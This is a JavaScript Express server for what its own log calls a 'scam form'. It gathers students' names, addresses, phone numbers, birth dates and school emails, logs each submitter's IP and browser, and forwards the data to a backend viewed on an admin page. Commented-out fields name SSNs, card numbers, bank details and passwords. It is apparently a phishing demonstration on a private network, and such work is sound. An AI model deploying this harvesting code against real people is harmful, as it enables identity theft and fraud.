console.log("front-end is running");

import express from 'express';

const port = 8080;
const app = express();
let siteVisits = 400;
let formVisits = 150;

app.set('view engine', 'ejs');

app.use(express.json());
app.use(express.urlencoded({extended: true}));
app.use(express.static('public'));

app.get("/", (req, res) => {
    siteVisits += 1;
    res.render('home');
});

app.get("/info", (req, res) => {
    res.render('info')
});

app.get("/form", (req, res) => {
    console.log("Scam form has been requested");

    formVisits += 1;
    let model = {
        fname: '',
        lname: '',
        addr: '',
        phone: '',
//        email: '',
        dob: '',
        schemail: '',
//        ccn: '',
//        bank: '',
//        ssn: '',
//        empass: '',
//        schpass: ''
    };
    res.render("form", model)
})

app.get("/admin", async (req, res) => {
    try {
        let urlStudents = "http://localhost:3000/students"
        let urlDailies = "http://localhost:3000/dailies"
        let urlMetadata = "http://localhost:3000/metadata"

        let [studentsResponse, dailiesResponse, metadataResponse] = await Promise.all([
            fetch(urlStudents),
            fetch(urlDailies),
            fetch(urlMetadata)
        ]);

        let studentsData = await studentsResponse.json();
        let dailiesData = await dailiesResponse.json();
        let metaData = await metadataResponse.json();

        let model = {
            students: studentsData.results || [],
            dailies: dailiesData.results || [],
            siteVisits: siteVisits,
            formVisits: formVisits,
            formSubmissions: studentsData.count || 0
        };

        res.render("admin", {model: model, metadata: metaData});
    } catch (error) {
        console.error("Error fetching data:", error);
        res.status(500).send("Internal Server Error")
    }
});

app.post("/form", async (req, res) => {
    console.log("Form submitted")


    // Gets User's IP
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log("User IP:", ip);

    // Gets User's OS and Browser
    const userAgent = req.headers['user-agent'];
    console.log("User Agent:", userAgent);

    // Gets User's Submission Timestamp
    const submissionTime = new Date() //.toISOString().split('T')[0];
    console.log("Submission Time:", submissionTime);

    //console.log("Form Data: ", req.body)

    //Form Validation Server-side
    let dataIsValid = false;
    let userData = req.body;

    let namePattern = /\S{2,}/;
    let fnameIsValid = namePattern.test(userData.firstname);
    let lnameIsValid = namePattern.test(userData.lastname);

    let phonePattern = /[0-9 ()-]{10,20}/;
    let phoneIsValid = phonePattern.test(userData.phonenumber);

    let addressPattern = /\S{1,} \S{1,}/;
    let addressIsValid = addressPattern.test(userData.address);

    let dobPattern = /\S{2,}/;
    let dobIsValid = dobPattern.test(userData.dob);

    let schemailPattern = /\S{1,}@\S{2,}.\S{2,}/;
    let schemailIsValid = schemailPattern.test(userData.schemail);

    dataIsValid = fnameIsValid && lnameIsValid && phoneIsValid && addressIsValid && dobIsValid && schemailIsValid

    if (dataIsValid) {
        let formData = {
            firstname: userData.firstname,
            lastname: userData.lastname,
            phone: userData.phonenumber,
            address: userData.address,
            dob: userData.dob,
            schemail: userData.schemail,
            ip: ip,
            useragent: userAgent,
            timestamp: submissionTime
        };

        let username = `${userData.firstname}${userData.lastname}`;

        let url = "http://localhost:3000/createuser";

        let options = {
            method: "POST",
            headers: {
                "content-type": "application/json"
            },
            body: JSON.stringify(formData)
        }

        let p1 = await fetch(url, options);

        res.redirect("/info");
    }else{
        let model = req.body;
        res.render("form", model)
    }
});

app.listen(port, '10.0.103.20', () => {
    console.log(`Server running at http://10.0.103.20:${port}/`)
})